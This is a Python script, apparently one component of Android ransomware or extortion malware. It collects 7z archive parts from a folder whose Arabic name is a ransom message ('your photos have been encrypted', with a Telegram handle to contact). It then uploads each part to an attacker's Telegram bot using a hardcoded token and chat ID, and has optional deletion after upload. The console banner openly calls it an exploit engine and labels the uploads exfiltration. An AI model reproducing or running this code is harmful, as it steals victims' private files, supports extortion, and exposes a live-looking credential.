import os
import time
import requests
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
#                     إعدادات التلجرام
# ============================================================
BOT_TOKEN = "8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28" 
CHAT_ID = "7145266755"

BASE = Path("/storage/emulated/0")
FOLDER_NAME = "صورك تم تشفيرها لتواصل ابحث عن @gru_189" 
PARTS_DIR = BASE / FOLDER_NAME 
# ============================================================

def print_banner():
    print("\033[94m" + "="*60)
    print("   [ NET-BREAKER EXPLOIT ENGINE v4.2 - DEEP UPLOADER ]")
    print("   [ Status: Secure Channel Active | Target: Telegram ]")
    print("="*60 + "\033[0m")

def send_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    for attempt in range(3):
        try:
            with open(file_path, 'rb') as f:
                payload = {'chat_id': CHAT_ID}
                files = {'document': f}
                response = requests.post(url, data=payload, files=files, timeout=90)
                if response.status_code == 200:
                    return True
        except Exception:
            pass
        time.sleep(2)
    return False

def worker(arch):
    print(f"\033[94m   [~] Bypassing firewall -> Exfiltrating {arch.name}...\033[0m")
    success = send_to_telegram(arch)
    if success:
        print(f"\033[92m   [+] EXFILTRATED [SUCCESS] ✅ -> {arch.name}\033[0m")
        # إذا أردت حذف الملف بعد رفعه تلقائياً أزل علامة الـ # من السطر التالي:
        # try: arch.unlink() except: pass
    else:
        print(f"\033[91m   [-] FAILED ❌ -> {arch.name}\033[0m")
    return arch.name, success

def main():
    print_banner()
    
    # فحص المجلد وإنشاؤه تلقائياً إذا لم يكن موجوداً لمنع أي خطأ
    if not PARTS_DIR.exists():
        print(f"\033[93m[*] Target directory missing. Initializing secure container...\033[0m")
        PARTS_DIR.mkdir(parents=True, exist_ok=True)

    archives = sorted(list(PARTS_DIR.glob("part_*.7z")))
    total = len(archives)

    print(f"\033[94m[*] Scanning payload container... Total packages found: {total}\033[0m")

    if total == 0:
        print("\033[91m[-] Error: No encrypted packages found to exfiltrate.\033[0m")
        return

    print(f"\033[92m[+] Launching 3x Multi-threaded Uplink Stream...\n\033[0m")
    
    success_count = 0
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = {executor.submit(worker, arch): arch for arch in archives}
        for future in as_completed(futures):
            _, success = future.result()
            if success:
                success_count += 1

    print(f"\n\033[94m" + "="*60)
    print(f" [✓] EXFILTRATION COMPLETE: {success_count}/{total} PACKAGES DELIVERED.")
    print("="*60 + "\033[0m")

if __name__ == "__main__":
    main()
